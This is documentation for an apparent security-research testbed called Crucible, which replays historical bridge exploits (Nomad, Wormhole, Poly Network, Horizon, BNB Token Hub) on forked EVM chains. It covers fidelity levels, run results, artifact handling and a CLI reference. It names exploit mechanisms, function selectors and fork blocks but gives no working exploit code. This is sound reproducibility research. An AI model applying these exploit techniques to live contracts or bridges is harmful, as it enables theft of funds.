Attack Declared Demonstrates Upper Bound Why It Can't Go Higher nomad_replica_fraud L2 [ok] Fork-state process() call with forged message; deterministic diff proven L3 Doesn't replay the exact historical exploit transaction (uses a reconstructed forged message). The real tx's 0x46e91d4f selector targets a proxy implementation function — requires proxy ABI resolution to reconstruct exactly. wormhole_guardian_bypass L2 [ok] EVM-side VAA processing via completeTransfer(); WormholeCore + TokenBridge contracts verified L2 Root cause was Solana-side (deprecated sysvar account validation). Only the EVM-side effects (forged VAA acceptance) are reproducible. Cannot achieve L3 without Solana execution environment. poly_network_privkey L2 [warn] Ethereum-side putCurEpochConPubKeyBytes via hash collision; determinism proven L4 Ethereum-only. BSC and Polygon archive RPCs at exploit blocks (9,755,172 / 16,332,982) require paid providers. Multi-chain relay not simulated. Full L4 needs all 3 chains + bridge coordination. horizon_multisig_drain L2 [ok] Fork-state reproduction at block 15005526; 3 bridge contracts verified (EthBridge, Erc20Bridge, BusdBridge); multisig authorization flow demonstrated via auto-impersonate; determinism proven L2 Infrastructure compromise. This was a compromised-multisig attack (2 of 5 validator keys), not a contract bug — reproducing the exact Ethereum tx would succeed but proves nothing about the vulnerability. Harmony chain state (non-EVM) is not forkable, blocking L4. The reproduction proves contracts were in a vulnerable state. multichain_router_permit L1 📝 Infrastructure narrative with evidence of MPC key shard compromise — Maxed at L1. This incident was an MPC node infrastructure compromise, not a smart contract vulnerability. No on-chain reproduction is possible — the attack happened entirely outside the EVM. This pack is correctly classified and cannot go higher. bnb_token_hub_proof L2 [ok] Fork-state reproduction at block 22166659 on BSC; CrossChain contract (0x...2000) identified as the real handlePackage() target (not TokenHub); function selector corrected to 0x84013b6a for handlePackage(bytes,bytes,uint64,uint64,uint8); malformed IAVL proof attempt confirmed; determinism proven L3 The malformed IAVL proof (amino-like encoding) reverts on eth_call — expected since the proof format doesn't match BSC's real amino encoding on a fresh fork. BSC-only (single chain). Requires paid BSC archive RPC (block 22M exceeds free tier limits). The reproduction confirms contract existence, function callability, and documents the vulnerability mechanism at L2.

docs.title: Fidelity Level Legend
docs.text: Level Description Requirement L4 Multi-chain full reproduction with bridge simulation All 3+ chains, bridge protocol mock, excluded_components declared L3 Exact historical transaction replay Exploit tx hash, calldata reconstruction, identical gas/events/storage L2 Fork-state behavioral reproduction Chains + affected_contracts verified at fork block L1 Conceptual / narrative only No code required — documentation of infrastructure-level events L0 No reproduction attempted Description only

docs.title: Actual Run Results (June 2026)
docs.text:
The benchmark matrix was run against 6 experiments. 5 of 6 pass with the expected fidelity level:

Experiment Outcome Fidelity Notes wormhole_replay ✅ Passed L2 passed Complete fork-state reproduction nomad_replay ✅ Passed L2 passed Gold-standard exemplar — deterministic diff proven poly_network_replay ✅ Passed L2 passed Ethereum-only; BSC/Polygon chains require paid archive horizon_replay ✅ Passed L2 passed Compromised-multisig reproduction at fork block 15005526 bnb_token_hub_replay ✅ Passed L2 passed Outcome:false expected — modeled reproduction of IAVL proof bypass multichain_replay ❌ Expected failure L1 (no AttackResult) L1 narrative — cannot be upgraded (see Per-Attack Fidelity Assessment)

Unit tests: 808 passed, 0 failed — no regressions from framework or bridge fixes.

docs.title: L4 Bridge Demos
docs.text:
Crucible also includes 2 L4 bridge experiments for end-to-end cross-chain validation:

Experiment Topology Outcome Limitation nomad_bridge_l4 nomad_bridge (ethereum + polygon) ✅ Passed (exit 0, outcome True) Polygon archive at fork block doesn't serve anvil_setBalance — chain skipped gracefully; use --no-fidelity for L4 demos demo_agent single (ethereum) ✅ Passed (exit 0) Uses mock provider — no LLM API key required

Polygon/BSC archive limitation: Both Polygon (block 16,332,982) and BSC (block 9,755,172) archives at these fork blocks cannot serve anvil_setBalance for newly created addresses. The bridge plugins handle this gracefully — the chain is skipped with a warning. This is an RPC provider depth limitation, not a code bug. See docs/RPC_PROVIDER_GUIDE.md for archive-compatible providers.

docs.title: Important Boundary
docs.text: Crucible is EVM-only. For attacks involving non-EVM components, the non-EVM portion must be declared in excluded_components and modeled explicitly.

docs.title: See Also
docs.text: Doc What It Covers Technical Overview System architecture, core concepts, data flow, design principles Design Decisions 15 key architectural decisions with rationale and tradeoffs Plugin Development Guide Writing attack, bridge, and agent plugins — step-by-step Attack Pack Guide End-to-end attack creation workflow Fidelity Guide Fidelity levels (L0–L4), enforcement rules, --no-fidelity usage Reproducibility Guide Provenance, determinism, bug log, publication workflow

docs.title: Crucible Testbed — Capabilities & Limitations
docs.text: Purpose: A clear, honest assessment of what the Crucible testbed can and cannot do. This document helps researchers, reviewers, and users understand the boundaries of the system before investing time in it.

docs.title: Quick Summary
docs.text:
Dimension Status Detail Benchmark attacks ✅ 5 of 6 pass All at L2 fork-state fidelity L4 bridge demos ✅ 2 of 2 pass nomad_bridge_l4, demo_agent (with --no-fidelity) Version ✅ v0.4.0 Tagged release — clean git history with professional commits Unit tests ✅ 808 passed, 0 failed No regressions, all passing Documentation ✅ 28 docs, comprehensive User guide, CLI, troubleshooting, fidelity, RPC, architecture, etc. Determinism checks ✅ 4 of 5 verified wormhole, nomad, horizon, bnb_token_hub all deterministic; poly_network has archive-RPC variability across 3 chains Cross-provider verification ❌ Skipped No second RPC provider available (free tiers only); see code-level analysis below Publication bundles ✅ 4 exported All passing experiments exported with integrity PASS; wormhole/nomad have 24 files each, horizon/bnb have 18 files each Artifact protection ✅ Permanent by default clean --all never touches logs/ or datasets/; --logs respects tiers; --datasets requires --confirm; publish adds .protected marker CI/CD ❌ Removed Local-only project — tests run on-device, no CI pipeline configured

Deep-dive reference: For a complete understanding of why the testbed is designed this way — the architecture, core concepts, design philosophy, and key decisions — see the Technical Overview and Design Decisions documents.

docs.title: 1. Reproduce 5 Historical Bridge Exploits at L2 (Fork-State)
docs.text:
Attack Chain Fork Block Damage What It Proves Wormhole Guardian Bypass Ethereum 14,125,553 $326M Forged VAA accepted by TokenBridge via completeTransfer() Nomad Replica Fraud Ethereum 15,259,100 $190M process() accepts forged message when committedRoot == 0x00 Poly Network PrivKey Ethereum 12,996,693 $611M Hash collision in verifyHeaderAndExecuteTx replaces bridge keeper Horizon Multisig Drain Ethereum 15,005,526 $100M 3 bridge contracts verified, multisig authorization flow demonstrated BNB Token Hub Proof BSC 22,166,659 $570M CrossChain contract identified, IAVL proof bypass mechanism documented

Each reproduction: - Forks the chain at the correct historical block - Verifies vulnerable contracts exist with non-empty code - Forges and sends exploit calldata - Verifies the exploit succeeded via storage slot changes - Produces deterministic artifact streams (events, gas, storage diffs, balance diffs)

docs.title: 2. Run L4 Multi-Chain Bridge Demonstrations
docs.text: Experiment Topology Chains What It Does nomad_bridge_l4 nomad_bridge ethereum + polygon Deploys NomadReplica contract on ethereum, sends forged cross-chain message demo_agent single ethereum Runs LLM agent workflow with mock provider (no API key needed)

docs.title: 3. Deploy Bridge Contracts to Forked Chains
docs.text:
Three bridge plugins are available for L4 experiments:

Bridge Plugin Chains Vulnerability Model nomad_bridge ethereum + polygon committedRoot == 0x00 — forged message accepted poly_network_bridge ethereum + polygon + bsc Hash collision in _executeCrossChainTx wormhole_bridge ethereum + polygon Guardian bypass — forged VAA accepted

docs.title: 4. Run LLM-Driven Agent Experiments
docs.text:
• Supports OpenAI, Anthropic, Ollama, and custom providers
  • Mock provider included for testing without any API key
  • Agent privilege levels: low, medium, high
  • Configurable task, objective, and account restrictions

docs.title: 5. Produce Verifiable, Deterministic Artifacts
docs.text:
Every experiment run produces:

Artifact Format What It Records run.jsonl JSONL All lifecycle events (phases, actions, status) events.jsonl JSONL All contract events emitted storage_diffs.jsonl JSONL Every storage slot that changed (before/after) gas_profile.jsonl JSONL Gas used per transaction balance_diffs.jsonl JSONL ETH/BNB balance changes cross_chain.jsonl JSONL Cross-chain message tracking run_manifest.json JSON Full provenance (git commit, Foundry version, config fingerprint) log_integrity.json JSON SHA-256 hashes of all streams artifact_bundle_manifest.json JSON SHA-256 hashes for export verification

docs.title: 6. Verify Artifact Integrity
docs.text:
• crucible verify <path> auto-detects run dirs, export bundles, and archives
  • --schemas validates JSONL stream structure
  • SHA-256 hashes detect tampering, missing files, or extra files

docs.title: 7. Run With or Without Docker
docs.text: Mode Setup Time Best For Docker ~3 min (one-time build) Formal reproductions, publications Local (uv + venv) ~1 min (one-time sync) Development, fast iteration Local (system-wide) ~1 min Dedicated testbed machines

docs.title: 1. Reproduce Non-EVM Attack Components
docs.text:
Crucible is EVM-only. It uses Foundry's anvil which can only fork EVM-compatible chains (Ethereum, BSC, Polygon). Attacks involving:

  • Solana (Wormhole root cause was Solana-side — EVM-side effects only are reproducible)
  • Cosmos/IBC (cross-chain messages originating from non-EVM chains)
  • Harmony ONE (Horizon bridge — Harmony chain is not EVM)
  • Moonriver (Multichain — Moonriver is Substrate/Kusama-based)
  • Substrate-based chains (Polkadot, Kusama, etc.)

...are documented in excluded_components in each attack's evidence.yaml. The non-EVM portion is modeled, not reproduced.

docs.title: 2. Reproduce Infrastructure Compromises
docs.text:
Attacks that were key compromises, not smart contract bugs:

Attack Type Why Not Reproducible Multichain (July 2023) MPC key shard theft No contract vulnerability; keys were legitimately authorized Horizon (June 2022) 2-of-5 multisig key compromise Contracts behaved as designed; reproducing the tx proves nothing

These are correctly classified as L1 (narrative) — the testbed documents the incident but cannot reproduce it on-chain.

docs.title: 3. Serve Full Archive State for Polygon/BSC at Old Blocks
docs.text:
This is an RPC provider limitation, not a Crucible bug. At the fork blocks used by the attack packs:

Chain Fork Block Free Archive? Paid Archive? Ethereum 12-16M ✅ Ankr free tier ✅ BSC 9.7M or 22M ❌ No free provider ✅ GetBlock $39/mo Polygon 16.3M ❌ No free provider ✅ GetBlock $39/mo

Even paid "archive" providers may fail to serve state for non-existent addresses at old fork blocks. This affects anvil_setBalance when bridge plugins try to fund new deployer addresses. The fix (applied to all 3 bridge plugins) wraps per-chain deployment in try/except — the offending chain is skipped gracefully.

docs.title: 4. Run L4 Experiments Without --no-fidelity
docs.text:
L4 fidelity enforcement checks for: - 2+ chains in historical_scope.chains - Bridge plugin in topology - excluded_components declared

Bridge demo experiments (e.g., nomad_bridge_l4) don't meet these requirements by design — they're demonstrations, not formal reproductions. Use --no-fidelity for L4 demos.

docs.title: 5. Guarantee Bit-Identical Cross-Platform Results
docs.text:
The run_manifest.json captures the full provenance (git commit, Foundry version, Python version, config fingerprint), but: - Different Foundry nightly versions may produce different gas estimates - Different RPC providers may return slightly different state roots - Cold vs warm cache affects timing but not results

For formal publications, use Docker (pinned environment) and run twice with crucible diff.

docs.title: Artifact Protection (June 2026)
docs.text: Artifacts are the most valuable output of the testbed. They are protected by multiple layers:

docs.title: Layer 1: clean --all Never Touches Artifacts
docs.text:
crucible clean --all only removes runtime state: .fork_cache, states/checkpoints/, states/snapshots/. It does NOT touch: - logs/ (experiment run artifacts) — protected unless --logs is explicitly passed - datasets/ (exported publication bundles) — protected unless --datasets --confirm is explicitly passed

This means it's safe to run clean --all between experiments without worrying about losing results.

docs.title: Layer 2: Explicit Flags for Artifact Cleanup
docs.text: Flag What It Cleans Protection --logs Run log directories (logs/*/*) saved and published tier runs preserved via run_manifest.json tier check --logs-older-than N Logs older than N days Same tier-based protection --datasets Exported dataset bundles (datasets/*) Requires --confirm; .protected marker preserved

docs.title: Layer 3: Publish Command Adds .protected Marker
docs.text: Running crucible publish <run_id>: 1. Sets the run's tier to published — protected from --logs and --logs-older-than 2. Writes a .protected marker file in datasets/<run_id>/ — protected from --datasets --confirm

docs.title: Layer 4: Docker Persistence
docs.text: The datasets/ directory is on the bind mount (.:/workspace), not on a Docker named volume. This means: - Export bundles survive container restarts and docker compose down - Files are directly accessible on the host filesystem at ./datasets/ - Not affected by Docker volume pruning

docs.title: Layer 5: Export Idempotency
docs.text: crucible export <run_id> will NOT overwrite an existing export bundle unless --force is passed. If the bundle already exists, it re-verifies integrity and regenerates reports without touching the copied source files.

docs.title: Known Issues & Workarounds
docs.text: Issue Affects Workaround Polygon archive at block 16,332,982 can't serve new addresses poly_network_bridge, nomad_bridge, wormhole_bridge Chain skipped gracefully; use GetBlock or QuickNode for full support BSC archive at block 9,755,172 needs paid provider poly_network_replay (3-chain), bnb_token_hub_replay Use GetBlock Starter ($39/mo) or run Ethereum-only Auto-merge may kill + restart chains between experiments All matrix runs Use --no-auto-merge to bypass; or let it re-fork automatically (fixed) Port TIME_WAIT after killing Anvil Auto-merge restart Crucible polls port for 10s before restarting (fixed); wait 30s if still failing Checkpoints snapshot dead chains Topology switching rm -f states/*.meta.json before switching (fixed in framework) Bridge bytecode double 0x prefix New bridge plugin development Use "data": bytecode (not "0x" + bytecode) — Foundry already has 0x Multichain L1 doesn't return AttackResult multichain_replay in benchmark matrix Use --continue-on-error when running matrix Agent experiments need LLM API key demo_agent with real provider Use agent_provider: mock for testing without API key

docs.title: What's Been Fixed (June 2026)
docs.text: 23 issues found and resolved across 3 validation rounds (22 bugs + 1 enhancement). See docs/REPRODUCIBILITY.md for the full log.

docs.title: Framework (4 bugs fixed)
docs.text:
• Auto-merge kills chain but never restarts → now re-forks automatically
  • Port TIME_WAIT after killing old Anvil → port polling loop (500ms × 20 attempts)
  • Checkpoints snapshot dead chains → filtered to active topology only
  • Fidelity failures hidden from console → reasons printed inline below [fail]

docs.title: Bridge Plugins (3 bugs fixed)
docs.text:
• Double 0x prefix in bytecode → removed extra "0x" +
  • Precompile deployer fails on archive nodes → try/except per-chain
  • Placeholder string in bridge evidence.yaml → empty list []

docs.title: CLI (1 feature added)
docs.text: • --no-auto-merge flag to bypass automatic fork block merging

docs.title: Documentation (6 docs created/updated)
docs.text:
• docs/FIDELITY_GUIDE.md — NEW comprehensive fidelity reference
  • docs/ATTACK_PACK_GUIDE.md — 8 new Common Pitfalls entries
  • docs/TROUBLESHOOTING.md — 9 new error entries + local environment section
  • docs/CLI_REFERENCE.md — Added --no-auto-merge, --no-fidelity flags
  • docs/SCENARIO_AUTHORING.md — Added --no-auto-merge note
  • docs/RPC_PROVIDER_GUIDE.md — Archive depth issues, fork block reference
  • docs/USER_GUIDE.md — UV/venv guide, Docker vs local comparison, local workflow
  • docs/REPRODUCIBILITY.md — Expanded lessons from 13 to 21 bugs
  • docs/BENCHMARKS.md — Actual run results, L4 bridge demo status

docs.title: Determinism Checks (Run Twice + Diff)
docs.text:
All 5 benchmark experiments were run twice and diffed to verify deterministic reproduction:

Experiment Topology Chains storage_equal events_equal gas_equal balances_equal Result wormhole_replay bridge ethereum + polygon ✅ true ✅ true ✅ true ✅ true Deterministic nomad_replay bridge ethereum + polygon ✅ true ✅ true ✅ true ✅ true Deterministic horizon_replay single ethereum ✅ true ✅ true ✅ true ✅ true Deterministic bnb_token_hub_replay single_bsc bsc ✅ true ✅ true ✅ true ✅ true Deterministic poly_network_replay poly_network_full ethereum + polygon + bsc ❌ false ✅ true ❌ false ❌ false Non-deterministic

4 of 5 experiments are fully deterministic. The only non-deterministic result (poly_network) is expected — it forks 3 chains simultaneously and Polygon/BSC archive RPCs may return slightly different state per run (see Archive RPC Limitations).

docs.title: Cross-Provider Verification
docs.text:
Not run. The .env includes only one free-tier RPC provider per chain:

ETHEREUM_RPC_URL=https://rpc.ankr.com/eth
POLYGON_RPC_URL=https://rpc.ankr.com/polygon
BSC_RPC_URL=https://rpc.ankr.com/bsc

A second RPC provider (e.g., GetBlock, QuickNode, Alchemy) would be needed to confirm results are provider-independent. At the code level, the framework has no provider-dependent logic — all chain interaction goes through the JSON-RPC client abstraction. Any provider-capable client should produce equivalent results if they serve the same archive state.

docs.title: Export Bundles
docs.text:
4 of 5 experiments have publication-ready export bundles in datasets/:

Experiment Run ID Path Files Integrity wormhole_replay DS-2026-00155 datasets/DS-2026-00155 24 ✅ PASS nomad_replay DS-2026-00158 datasets/DS-2026-00158 24 ✅ PASS horizon_replay DS-2026-00160 datasets/DS-2026-00160 18 ✅ PASS bnb_token_hub_replay DS-2026-00159 datasets/DS-2026-00159 18 ✅ PASS

File count varies by topology complexity: bridge-topology experiments (wormhole, nomad) produce 24 files from 2 forked chains; single-chain experiments (horizon, bnb) produce 18 files from 1 chain.

Each bundle contains: - artifact_bundle_manifest.json — SHA-256 hashes of every file - publication_report.json — machine-readable report with outcome, assertions - provenance.json — extracted provenance data - assertions.json — all assertion results from the run - REPRODUCE.md — exact reproduction instructions - All original run artifacts (run.jsonl, events.jsonl, storage_diffs.jsonl, etc.)

docs.title: Recommended Next Steps
docs.text: Priority Task Why Medium Cross-provider verification (run with second RPC provider) Proves results aren't provider-specific Low Add L4 bridge topology for poly_network + wormhole More comprehensive cross-chain coverage

docs.title: See Also
docs.text: Doc What It Covers docs/BENCHMARKS.md Benchmark status, per-attack fidelity assessment, run results docs/REPRODUCIBILITY.md Provenance, determinism, full bug log docs/FIDELITY_GUIDE.md Fidelity levels (L0-L4), enforcement, --no-fidelity usage docs/ATTACK_PACK_GUIDE.md Creating new attack plugins docs/TROUBLESHOOTING.md Common errors and fixes docs/RPC_PROVIDER_GUIDE.md Archive RPC provider comparison and costs docs/USER_GUIDE.md Getting started, Docker vs local docs/CLI_REFERENCE.md All CLI commands and flags docs/internal/TECHNICAL_OVERVIEW.md System architecture, core concepts, data flow, design principles docs/internal/DESIGN_DECISIONS.md 15 key architectural decisions with rationale and tradeoffs

docs.title: Workspace
docs.text:
crucible init                              # create runtime directories
crucible doctor                            # validate environment (Python, Foundry, config, RPC, dirs, Streamlit, Docker)
crucible doctor --ports                    # validate environment + check port availability
crucible doctor --foundry --python         # targeted checks only
crucible doctor --fix                      # auto-fix common environment issues (broken symlinks, missing dirs)
crucible status                            # show running chains, determinism flags, block numbers
crucible status --disk                     # show disk usage breakdown per directory
crucible summary                           # one-shot workspace overview (chains, runs, disk usage)
crucible clean                             # stop chains only
crucible clean --cache                     # remove fork cache only
crucible clean --checkpoints               # remove experiment checkpoints only
crucible clean --states                    # remove non-baseline snapshots only
crucible clean --logs                      # remove all log run directories (scratch tier only; saved/published preserved)
crucible clean --logs-older-than 30        # remove logs older than N days (tier-protected)
crucible clean --datasets --confirm        # remove exported dataset bundles (.protected preserved)
crucible clean --all                       # runtime artifacts only: cache + checkpoints + snapshots.
                                           # Does NOT touch logs/ or datasets/ — those are
                                           # research artifacts with separate protection.
                                           # Use --logs or --datasets explicitly to clean them.
crucible instrument                        # standalone RPC proxy for ad-hoc tx instrumentation (also supports --upstream, --chain, --output-dir, --port, --timeout)
crucible notebook                          # launch Jupyter for experiment analysis (also supports --port, --notebooks-dir, --no-browser)
crucible dashboard                         # launch Streamlit dashboard
crucible --version                         # show version
crucible --dry-run <command>               # preview without executing

docs.title: Chains
docs.text:
crucible fork --topology single            # start Anvil for single chain
crucible fork --topology bridge            # start Anvil for dual chain + bridge
crucible fork --topology bridge --fork-timeout 600  # wait up to 600s for chains to become ready
crucible setup --topology bridge           # fork + run bootstrap.py + guidance to capture baseline
crucible setup --skip-bootstrap            # fork only, skip state preparation

docs.title: Snapshots And Baselines
docs.text:
Baseline: A fingerprint of the chain state at a specific fork block. It detects environment drift — if the RPC provider changed, the topology was tweaked, or the fork block shifted between runs, the baseline hash won't match and the experiment fails early, before wasting time on false results.

When to use --no-baseline: Skip baseline verification on first runs (no baseline exists yet) or during attack development. The baseline is captured after the first successful run.

crucible snapshot create <name>            # named snapshot of running chains
crucible snapshot create <name> --chain ethereum  # snapshot specific chain
crucible snapshot restore <name> --chain ethereum # restore specific chain

crucible baseline capture <scenario> --topology bridge  # capture golden baseline
crucible baseline verify <scenario>       # verify baseline fingerprint

crucible reset --scenario <scenario>                  # soft reset (anvil_loadState, <5s)
crucible reset --scenario <scenario> --mode medium    # kill + relaunch + restore (<30s)
crucible reset --scenario <scenario> --mode hard      # re-fork + re-bootstrap + restore (<5min)
crucible hard-reset --scenario <scenario>             # alias for --mode hard

docs.title: Plugins
docs.text:
crucible plugin list                       # all discovered plugins
crucible plugin list --type attack         # filter by type
crucible plugin list --type bridge         # filter by type (bridge)
crucible plugin validate attacks/demo_attack  # validate plugin manifest + interface
crucible plugin validate bridges/nomad_bridge  # validate bridge plugin + evidence.yaml
crucible plugin validate bridges/poly_network_bridge
crucible plugin validate bridges/wormhole_bridge

Bridge plugins deploy real Solidity contracts to forked chains and support the full lifecycle: deploy -> configure -> connect -> send_message -> reset -> destroy. Each requires plugin.yaml and evidence.yaml describing the protocol version, supported chains, modeled features, and known limitations.

Available bridge plugins: - nomad_bridge — Nomad Replica with committedRoot == 0x00 vulnerability (ethereum + polygon) - poly_network_bridge — EthCrossChainManager + EthCrossChainData hash collision (ethereum + polygon + bsc) - wormhole_bridge — WormholeCore + TokenBridge guardian bypass (ethereum + polygon)

docs.title: Experiments
docs.text:
crucible experiment run experiments/demo_experiment.yaml           # formal run with baseline verification
crucible experiment run experiments/demo_experiment.yaml --no-baseline  # skip baseline check
crucible experiment run experiments/demo_experiment.yaml --publication-mode  # enforce publication gates
crucible experiment run experiments/demo_experiment.yaml --name "my-label"  # add human-readable alias
crucible experiment run experiments/demo_experiment.yaml --tier saved  # preserve: scratch|saved|published
crucible experiment run experiments/demo_experiment.yaml --no-auto-merge     # skip auto-merge of fork_block from evidence.yaml (keep current fork block)
crucible experiment run experiments/demo_experiment.yaml --no-fidelity       # skip fidelity enforcement (fidelity is enabled by default)
crucible experiment run experiments/demo_experiment.yaml --record path/to/fixture.jsonl  # record RPC calls to fixture
crucible experiment run experiments/nomad_replay.yaml --no-fidelity          # demo/simulation experiments
crucible experiment matrix experiments/benchmark_matrix.yaml       # run matrix of experiments
crucible experiment matrix ... --continue-on-error                 # keep running after failures
crucible experiment resume <run_id>                                # resume interrupted experiment
crucible experiment checkpoints                                    # list checkpoint manifests

docs.title: Run Tiers
docs.text:
Each run is assigned a retention tier: - scratch (default) — auto-cleaned after 7 days - saved — preserved indefinitely - published — preserved indefinitely, never auto-cleaned

crucible experiment run experiments/nomad_replay.yaml --tier saved
crucible publish <run_id>                     # mark an existing run as published

docs.title: Fidelity Enforcement
docs.text:
Fidelity enforcement runs by default after every experiment. It validates runtime behavior against the fidelity level declared in the attack plugin's evidence.yaml. Use --no-fidelity to skip these checks (demo/simulation experiments):

Level What's Enforced L0 None (narrative only — always passes) L1 Attack plugin returned a result L2 Chains exist in topology, trace artifacts present, no trace failures L3 All L2 + exact_tx_replay=true, exploit_transactions non-empty, tx actions found L4 All L3 + multi-chain topology + bridge plugin + excluded_components declared

L4 topology examples:

Topology Bridge Plugin Chains topologies/nomad_bridge.yaml nomad_bridge ethereum + polygon topologies/poly_network_bridge.yaml poly_network_bridge ethereum + polygon + bsc topologies/wormhole_bridge.yaml wormhole_bridge ethereum + polygon

Fidelity is always active. To skip: 

crucible experiment run experiments/nomad_replay.yaml --no-fidelity

docs.title: History & Logs
docs.text:
crucible logs list                           # list completed run manifests
crucible history                             # query experiment history (most recent only)
crucible history --tag wormhole --outcome success --limit 5       # filtered query
crucible history --tier saved                              # show only saved/preserved runs
crucible history --tier scratch                            # show only scratch (auto-cleanable) runs
crucible history --rebuild                   # rebuild index from log manifests
crucible diff <run_a> <run_b>                # canonical comparison of two runs

docs.title: Publication & Export
docs.text:
Crucible separates two distinct concepts:

  • export — creates a publication artifact bundle (a self-contained directory or archive with all run artifacts, manifests, and provenance data). This is the data you would upload to Zenodo, a conference artifact evaluation, or a shared dataset.
  • publish — marks a run for indefinite retention by setting its tier to published. This protects the run from crucible clean --logs-older-than auto-cleanup and displays it prominently in history queries.

Both are part of the publication lifecycle, but they serve different purposes: export produces shareable data, publish manages local retention.

crucible export <run_id>                          # export run as publication bundle (dir)
crucible export <run_id> --format tar-gz          # compress as tar.gz
crucible export <run_id> --format zip             # compress as zip
crucible export <run_id> --force                  # overwrite existing export bundle
crucible publish <run_id>                         # mark run as published (preserved from auto-cleanup)

crucible verify <path>                            # verify artifact integrity (run, bundle, or .tar.gz/.zip)
crucible verify <path> --verbose                  # show all files, including matched ones
crucible verify <path> --schemas                  # also validate JSONL artifact structure

crucible bundle hash <path>                       # compute SHA-256 hash of bundle
crucible bundle verify <path>                     # verify bundle integrity (alias for `crucible verify` — auto-detects run vs bundle + supports --schemas)

Lifecycle summary: experiment run --tier saved → publish <run_id> → export <run_id> --format tar-gz → upload bundle to Zenodo / archive.

docs.title: Verify
docs.text:
crucible verify automatically detects whether path is: - A run directory — re-computes hashes against log_integrity.json - An export bundle — re-computes hashes against artifact_bundle_manifest.json - A .tar.gz, .tgz, .zip, or .tar archive — auto-extracts to a temp directory, then verifies - Both run and bundle — runs both checks on the same directory

Archives are extracted transparently before verification. The temp directory is cleaned up automatically when verification completes.

Reports hash mismatches, missing files, and extra files not tracked in the integrity manifest.

With --schemas, also validates the structure of all JSONL artifact streams against expected schemas — catching missing required fields, type mismatches, and data corruption.

crucible verify logs/nomad_replay/DS-2026-00042
#   [ok] Verification: PASS (1 check)
#      [ok]  Run integrity     (log_integrity.json)
#           6 file(s) verified
#   All artifacts intact at: ...

crucible verify datasets/DS-2026-00042
#   [ok] Verification: PASS (1 check)
#      [ok]  Bundle integrity (artifact_bundle_manifest.json)
#           12 file(s) verified
#   All artifacts intact at: ...

crucible verify datasets/DS-2026-00042.tar.gz
#   Extracted DS-2026-00042.tar.gz to /tmp/crucible_verify_... for verification
#   [ok] Verification: PASS (1 check)
#      [ok]  Bundle integrity (artifact_bundle_manifest.json)
#           12 file(s) verified
#   All artifacts intact at: ...

crucible verify datasets/DS-2026-00042 --schemas
#   [ok] Verification: PASS (2 checks)
#      [ok]  Bundle integrity (artifact_bundle_manifest.json)
#      [ok]  Schema validation (4 stream(s), 6 entries)
#   All artifacts intact at: ...

docs.title: Verify --schemas (JSONL Schema Validation)
docs.text:
Validates each JSONL artifact file against its expected schema:

Stream Required Fields Type Checks run.jsonl phase, action, status, message exit_code: int events.jsonl phase, chain, event_name block_number: int storage_diffs.jsonl phase, chain, contract, slot, before, after — gas_profile.jsonl phase, step, gas_used gas_used: int balance_diffs.jsonl phase, chain, contract, account, before, after — cross_chain.jsonl phase, correlation_id, source_chain, dest_chain block_number: int agent_reasoning.jsonl step, observation, action step: int

Scans root-level, chain_*, and bridge/ subdirectories automatically.

docs.title: Attack Pack Tooling
docs.text:
crucible attack init <name>                           # scaffold new attack plugin from template
crucible attack init <name> --chain ethereum           # specify target chain (default: ethereum)
crucible attack init <name> --fidelity L2              # set fidelity level
crucible attack init <name> --with-scenario            # also generate a pre-exploit scenario YAML
crucible attack init <name> --from-tx <tx_hash>        # populate scaffold from on-chain transaction
crucible attack init <name> --from-tx <tx_hash> --rpc-url <url>  # custom RPC for tx fetch

crucible attack extract <tx_hash> --name <name> --chain ethereum
  # Auto-generate attack pack from on-chain transaction (with ABI decoding)
  # Fetches tx, ABI, decodes function call, generates plugin + evidence + scenario
  # Options: --rpc-url <url>, --protocol <name>, --output <dir>
  #
  # [warn] Reliability note: This is a scaffolding tool, not a fully automated
  #   exploit generator. ABI decoding is best-effort (~60% success rate) and
  #   the generated plugin.py contains TODO stubs, not working exploit logic.
  #   The evidence.yaml date is auto-filled from the block timestamp when
  #   available. ABI fetch may fail for unverified contracts. Always review
  #   and customize the generated files before running experiments.

docs.title: attack init vs attack extract
docs.text: Command Use Case What It Does attack init Quick scaffold from scratch Blank template with placeholders attack init --from-tx Scaffold with real tx metadata Fills fork block, contract address, attacker address from on-chain data attack extract Full automated extraction Fetches ABI, decodes calldata, generates call code + ABI mapping

docs.title: Evidence Validation
docs.text:
crucible evidence check <attack>                    # validate evidence.yaml claims against running chains
crucible evidence check <attack> --fork             # fork chains, validate, then clean up (all in one step)
crucible evidence check <attack> --fork --topology bridge  # specify topology for --fork mode

Validates that: 1. Each declared fork block exists on the running chain via eth_getBlockByNumber 2. Each declared contract has non-empty code via eth_getCode (catches EOA vs contract mistakes)

With --fork, chains are started from the specified topology, validated, and stopped — no manual crucible fork needed.

docs.title: ABI Registry
docs.text:
crucible abi list                           # list registered ABI entries
crucible abi validate                       # validate all ABI JSON files
crucible abi fetch 0xContractAddress        # fetch ABI from Etherscan (default, requires ETHERSCAN_API_KEY)
crucible abi fetch 0xContractAddress --source sourcify # from Sourcify (no API key needed)
crucible abi fetch 0xContractAddress --source etherscan --chain ethereum  # from Etherscan with chain override

docs.title: Fork Cache Management
docs.text:
crucible cache inspect                      # show cache entries with provenance
crucible cache fingerprint                  # compute aggregate cache fingerprint
crucible cache verify --chain ethereum --fork-block 15259101  # verify cache provenance
crucible cache clean --chain ethereum       # remove cache for specific chain
crucible cache clean --all                  # remove all fork cache

docs.title: Architecture
docs.text: The CLI is organized as a modular crucible/commands/ package (20 sub-modules) with a shared CliState replacing the old global _DRY_RUN flag. See ARCHITECTURE.md for the full component map.

docs.title: Custom Contract Testing Guide
docs.text: Use Crucible as your own smart contract security testbed — write, deploy, and attack custom contracts from scratch, not just replay known exploits.

docs.title: Table of Contents
docs.text:
1. What This Guide Covers
  2. Two Modes Of Operation
  3. Worked Example: An Access Control Bug
  4. Step 1: Write the Contract
  5. Step 2: Write the Deploy Script
  6. Step 3: Create the Scenario
  7. Step 4: Write the Attack Plugin
  8. Step 5: Wire the Experiment
  9. Step 6: Run and Verify
  10. Blank-Chain Mode (No Fork)
  11. Iterating On Contracts
  12. Advanced Patterns
  13. Best Practices
  14. Troubleshooting

docs.title: What This Guide Covers
docs.text:
Crucible was designed for exploit reproduction, but it's also a powerful general-purpose smart contract testbed. You can:

  • Write your own Solidity contracts and deploy them to a forked or blank EVM
  • Test them under attack using Crucible's Python plugin system and instrumentation
  • Capture every artifact — events, gas, storage diffs, balance changes — automatically
  • Prove determinism — run twice, diff, confirm identical results
  • Export verifiable bundles — SHA-256 locked, publishable as evidence

This guide walks through the complete workflow: from an empty directory to a running experiment on your own custom contracts.

docs.title: Mode 1: Forked Chain + Custom Contracts (Hybrid)
docs.text:
